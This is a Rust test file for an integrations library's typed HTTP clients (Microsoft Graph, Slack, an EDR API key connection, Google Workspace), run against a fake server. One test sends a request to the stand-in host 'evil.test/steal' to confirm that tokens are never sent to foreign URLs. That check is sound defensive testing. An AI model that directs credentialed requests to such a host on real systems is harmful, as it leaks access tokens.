//! Typed clients and the `Connection<P, S>` extractor, with the fake.

use std::sync::Arc;

use http::Method;
use navree_http::{AppError, Controller, Json, ModuleBuilderHttpExt, RouteDef};
use navree_http_client::FakeResponse;
use navree_integrations::{
    Connection, GoogleWorkspace, IntegrationsError, MicrosoftGraph, NewApiKey, NewServiceAccount,
    Owner, Slack,
};
use navree_kernel::{BoxFuture, Injectable, KernelError, Module, ModuleBuilder, Resolver};
use serde_json::{Value, json};

use crate::scopes::DirectoryRead;
use crate::support::{harness, service_account};

const TENANT: &str = "9188040d-6c67-4c5b-b112-36a304b66dad";

/// A feature that reads the directory through the extractor.
struct DirectoryController;

impl Injectable for DirectoryController {
    fn construct(_r: Resolver) -> BoxFuture<'static, Result<Self, KernelError>> {
        Box::pin(async { Ok(DirectoryController) })
    }
}

async fn users(graph: Connection<MicrosoftGraph>) -> Result<Json<Value>, AppError> {
    let users: Vec<Value> = graph.paginate("/users?$select=id,mail").await?;
    Ok(Json(json!({ "tenant": graph.tenant_id(), "users": users })))
}

async fn directory(graph: Connection<MicrosoftGraph, DirectoryRead>) -> Json<Value> {
    Json(json!({ "scope_set": graph.info().scope_set }))
}

impl Controller for DirectoryController {
    fn prefix(&self) -> &'static str {
        "/directory"
    }

    fn routes(self: Arc<Self>) -> Vec<RouteDef> {
        vec![
            RouteDef::on(Method::GET, "/users", users).public(),
            RouteDef::on(Method::GET, "/scoped", directory).public(),
        ]
    }
}

struct DirectoryModule;

impl Module for DirectoryModule {
    fn register(&self, m: &mut ModuleBuilder) {
        m.controller::<DirectoryController>();
    }
}

#[tokio::test]
async fn the_extractor_gives_a_graph_client_that_pages_through_results() {
    let h = harness(|b| b.module(DirectoryModule)).await;
    // Not connected yet.
    h.app
        .client()
        .get("/api/directory/users")
        .send()
        .await
        .assert_error(404, "Microsoft 365 is not connected")
        .assert_error_code(404, "integration_not_connected");

    h.connect_microsoft(Owner::App, TENANT).await;
    h.fake.api().on_sequence(
        Method::GET,
        "https://graph.microsoft.com/v1.0/users*",
        [
            FakeResponse::new(200).json(&json!({
                "value": [{ "id": "u1", "mail": "ada@acme.test" }],
                "@odata.nextLink": "https://graph.microsoft.com/v1.0/users?$select=id,mail&$skiptoken=X2"
            })),
            FakeResponse::new(200).json(&json!({
                "value": [{ "id": "u2", "mail": "grace@acme.test" }]
            })),
        ],
    );
    h.app
        .client()
        .get("/api/directory/users")
        .send()
        .await
        .assert_status(200)
        .assert_json_path("tenant", json!(TENANT))
        .assert_json_path("users.0.mail", json!("ada@acme.test"))
        .assert_json_path("users.1.mail", json!("grace@acme.test"));
    let sent = h.fake.api().recorded();
    assert_eq!(sent.len(), 2);
    assert!(sent[1].url().as_str().contains("skiptoken=X2"));
    let token = h.fake.minted().len();
    assert_eq!(token, 1);
    assert!(sent.iter().all(|r| {
        r.header("authorization")
            .is_some_and(|v| v.starts_with("Bearer fake-microsoft-"))
    }));

    // The directory scope set is its own connection.
    h.app
        .client()
        .get("/api/directory/scoped")
        .send()
        .await
        .assert_error_code(404, "integration_not_connected");
}

#[tokio::test]
async fn a_401_gets_one_more_try_with_a_new_token() {
    let h = harness(|b| b).await;
    h.connect_microsoft(Owner::App, TENANT).await;
    h.fake.api().on_sequence(
        Method::GET,
        "https://graph.microsoft.com/v1.0/organization",
        [
            FakeResponse::new(401)
                .json(&json!({ "error": { "code": "InvalidAuthenticationToken" } })),
            FakeResponse::new(200).json(&json!({ "value": [] })),
        ],
    );
    let graph = h
        .integrations()
        .await
        .client_for::<MicrosoftGraph>(Owner::App)
        .await
        .unwrap();
    let response = graph.get("/organization").send().await.unwrap();
    assert_eq!(response.status().as_u16(), 200);
    let sent = h.fake.api().recorded();
    assert_eq!(sent.len(), 2);
    assert_ne!(
        sent[0].header("authorization"),
        sent[1].header("authorization")
    );
    assert_eq!(h.fake.minted().len(), 2);
}

#[tokio::test]
async fn tokens_never_leave_the_providers_hosts() {
    let h = harness(|b| b).await;
    h.connect_microsoft(Owner::App, TENANT).await;
    let graph = h
        .integrations()
        .await
        .client_for::<MicrosoftGraph>(Owner::App)
        .await
        .unwrap();
    let error = graph
        .get("https://evil.test/steal")
        .send()
        .await
        .unwrap_err();
    assert!(
        matches!(error, IntegrationsError::ForeignUrl { .. }),
        "{error:?}"
    );
    h.fake.api().assert_nothing_sent();
    assert!(h.fake.minted().is_empty());
    assert_eq!(graph.base_url(), Some("https://graph.microsoft.com/v1.0"));
}

#[tokio::test]
async fn slack_calls_check_the_ok_flag() {
    let h = harness(|b| b).await;
    h.fake.on_code(
        "slack",
        "code",
        navree_integrations::FakeGrant::new()
            .access_token("xoxb-1")
            .never_expires()
            .external_id("T0123ABCD"),
    );
    let integrations = h.integrations().await;
    let state = integrations
        .connect_url(Owner::App, "slack", Default::default())
        .await
        .unwrap()
        .state;
    integrations
        .complete(
            Owner::App,
            "slack",
            &navree_integrations::ConnectCallback::code(state, "code"),
            None,
        )
        .await
        .unwrap();
    h.fake.api().on_sequence(
        Method::POST,
        "https://slack.com/api/chat.postMessage",
        [
            FakeResponse::new(200).json(&json!({ "ok": true, "ts": "1730016000.000100" })),
            FakeResponse::new(200).json(&json!({ "ok": false, "error": "channel_not_found" })),
            FakeResponse::new(200).json(&json!({ "ok": false, "error": "ratelimited" })),
        ],
    );
    let slack = integrations.client_for::<Slack>(Owner::App).await.unwrap();
    assert_eq!(slack.team_id(), Some("T0123ABCD"));
    let message = json!({ "channel": "C0123", "text": "Deal won" });
    let body = slack.call("chat.postMessage", &message).await.unwrap();
    assert_eq!(body["ts"], "1730016000.000100");
    h.fake.api().assert_sent(|r| {
        r.header("authorization") == Some("Bearer xoxb-1")
            && r.json::<Value>().unwrap()["channel"] == "C0123"
    });
    let error = slack.call("chat.postMessage", &message).await.unwrap_err();
    assert_eq!(error.to_string(), "Slack API error: channel_not_found");
    assert!(matches!(
        slack.call("chat.postMessage", &message).await,
        Err(IntegrationsError::Unavailable { .. })
    ));
}

#[tokio::test]
async fn api_key_clients_send_the_key_to_the_connections_own_root() {
    let h = harness(|b| b).await;
    h.fake.api().on(
        Method::GET,
        "https://acme.edr.example/api/v1/health",
        FakeResponse::new(200),
    );
    h.fake.api().on(
        Method::GET,
        "https://acme.edr.example/api/v1/alerts*",
        FakeResponse::new(401),
    );
    let integrations = h.integrations().await;
    integrations
        .connect_api_key(
            Owner::App,
            "edr",
            NewApiKey::new("edr-key").api_url("https://acme.edr.example/api"),
        )
        .await
        .unwrap();
    let edr = integrations
        .client(Owner::App, "edr", "default")
        .await
        .unwrap();
    assert_eq!(edr.base_url(), Some("https://acme.edr.example/api"));
    let response = edr
        .get("/v1/alerts")
        .query(&[("severity", "high")])
        .send()
        .await
        .unwrap();
    // A 401 for a key is the answer: there is no new key to try.
    assert_eq!(response.status().as_u16(), 401);
    let alerts: Vec<_> = h
        .fake
        .api()
        .recorded()
        .into_iter()
        .filter(|r| r.url().path() == "/api/v1/alerts")
        .collect();
    assert_eq!(alerts.len(), 1);
    assert_eq!(alerts[0].url().query(), Some("severity=high"));
    assert_eq!(alerts[0].header("x-api-key"), Some("edr-key"));
    assert_eq!(alerts[0].header("authorization"), None);
    // `send_json` turns the status into an error.
    assert!(matches!(
        edr.get("/v1/alerts").send_json::<Value>().await,
        Err(IntegrationsError::Http(_))
    ));
}

#[tokio::test]
async fn google_clients_page_with_tokens_and_reach_other_googleapis_hosts() {
    let h = harness(|b| b).await;
    let integrations = h.integrations().await;
    integrations
        .connect_service_account(
            Owner::App,
            "google",
            NewServiceAccount::new(service_account(), Some("admin@acme.test".into())),
        )
        .await
        .unwrap();
    h.fake.api().on_sequence(
        Method::GET,
        "https://admin.googleapis.com/admin/directory/v1/users*",
        [
            FakeResponse::new(200).json(&json!({
                "users": [{ "primaryEmail": "ada@acme.test" }],
                "nextPageToken": "p2"
            })),
            FakeResponse::new(200).json(&json!({
                "users": [{ "primaryEmail": "grace@acme.test" }]
            })),
        ],
    );
    let google = integrations
        .client_for::<GoogleWorkspace>(Owner::App)
        .await
        .unwrap();
    let users: Vec<Value> = google
        .paginate(
            "https://admin.googleapis.com/admin/directory/v1/users?customer=my_customer",
            "users",
        )
        .await
        .unwrap();
    assert_eq!(users.len(), 2);
    let sent = h.fake.api().recorded();
    assert!(sent[1].url().as_str().contains("pageToken=p2"));
    assert!(sent[1].url().as_str().contains("customer=my_customer"));
}
